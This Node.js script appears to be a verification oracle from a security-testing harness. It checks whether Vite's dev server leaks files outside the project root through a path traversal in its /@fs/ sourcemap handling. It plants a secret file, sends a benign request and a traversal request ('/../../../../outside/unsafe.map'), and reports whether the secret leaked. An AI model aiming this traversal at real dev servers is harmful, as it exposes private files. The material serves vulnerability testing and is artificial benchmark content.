'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function send(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

async function main() {
  let vite;
  try {
    vite = require('vite');
  } catch (e) {
    send({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  const marker = 'vite_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const baseDir = path.join(os.tmpdir(), marker);
  const projectRoot = path.join(baseDir, 'project');
  const depsDir = path.join(projectRoot, 'node_modules', '.vite', 'deps');
  const outsideDir = path.join(baseDir, 'outside');

  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(outsideDir, { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'src'), { recursive: true });

    // A legitimate map file inside the optimized deps directory.
    const legitMapPath = path.join(depsDir, 'legit-chunk.js.map');
    fs.writeFileSync(legitMapPath, JSON.stringify({ version: 3, sources: ['legit.js'], mappings: '' }), 'utf-8');

    // A secret file OUTSIDE the project root, ending in .map, parseable JSON.
    const secretMarkerValue = 'SECRET_' + marker;
    const secretMapPath = path.join(outsideDir, 'unsafe.map');
    fs.writeFileSync(secretMapPath, JSON.stringify({ key: secretMarkerValue }), 'utf-8');

    // minimal index.html so Vite root is valid
    fs.writeFileSync(path.join(projectRoot, 'index.html'), '<html><body></body></html>', 'utf-8');
    fs.writeFileSync(path.join(projectRoot, 'src', 'main.js'), 'export const x = 1;', 'utf-8');

    server = await vite.createServer({
      root: projectRoot,
      logLevel: 'silent',
      configFile: false,
      server: {
        middlewareMode: true,
        fs: { strict: true, allow: [projectRoot] },
      },
      optimizeDeps: { noDiscovery: true, include: [] },
    });

    const makeRequest = (reqUrl) => {
      return new Promise((resolve) => {
        const req = {
          url: reqUrl,
          method: 'GET',
          headers: { host: 'localhost' },
          on() {},
          socket: {},
        };
        let statusCode = 200;
        let body = '';
        let ended = false;
        const res = {
          setHeader() {},
          getHeader() { return undefined; },
          removeHeader() {},
          writeHead(code) { statusCode = code; },
          end(chunk) {
            if (ended) return;
            ended = true;
            if (chunk) body += chunk.toString();
            resolve({ statusCode, body });
          },
          write(chunk) {
            if (chunk) body += chunk.toString();
          },
          get statusCode() { return statusCode; },
          set statusCode(v) { statusCode = v; },
        };
        let settled = false;
        const origResolve = resolve;
        const safeResolve = (v) => {
          if (!settled) {
            settled = true;
            origResolve(v);
          }
        };
        res.end = function (chunk) {
          if (chunk) body += chunk.toString();
          safeResolve({ statusCode, body });
        };
        try {
          server.middlewares(req, res, () => {
            safeResolve({ statusCode: statusCode || 404, body });
          });
        } catch (e) {
          safeResolve({ statusCode: 500, body: String(e && e.message) });
        }
        setTimeout(() => safeResolve({ statusCode: statusCode || 0, body }), 4000);
      });
    };

    // Benign request: legitimate map file within optimized deps dir.
    const benignUrl = '/@fs/' + legitMapPath.split(path.sep).join('/');
    const benignResp = await makeRequest(benignUrl);

    if (benignResp.statusCode !== 200 || !benignResp.body.includes('legit.js')) {
      evidence = 'benign request to legitimate optimized deps sourcemap failed: status=' + benignResp.statusCode + ' body=' + benignResp.body.slice(0, 200);
      send({ operation_completed: false, exploit_succeeded: false, evidence });
    } else {
      operation_completed = true;

      // Malicious request: traverse out of node_modules/.vite/deps to outside/unsafe.map
      const traversalUrl =
        '/@fs/' + depsDir.split(path.sep).join('/') + '/../../../../outside/unsafe.map';

      const maliciousResp = await makeRequest(traversalUrl);

      if (maliciousResp.statusCode === 200 && maliciousResp.body.includes(secretMarkerValue)) {
        exploit_succeeded = true;
        evidence = 'path traversal succeeded: status=' + maliciousResp.statusCode + ' leaked secret content from outside project root';
      } else {
        exploit_succeeded = false;
        evidence = 'path traversal blocked: status=' + maliciousResp.statusCode + ' body=' + maliciousResp.body.slice(0, 200);
      }

      send({ operation_completed, exploit_succeeded, evidence });
    }
  } catch (e) {
    send({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception: ' + String(e && e.message) });
  } finally {
    try {
      if (server && typeof server.close === 'function') {
        await server.close();
      }
    } catch (e) {
      // ignore cleanup errors
    }
    try {
      fs.rmSync(baseDir, { recursive: true, force: true });
    } catch (e) {
      // ignore cleanup errors
    }
  }
}

main().catch((e) => {
  send({ operation_completed: false, exploit_succeeded: false, evidence: 'top-level exception: ' + String(e && e.message) });
});
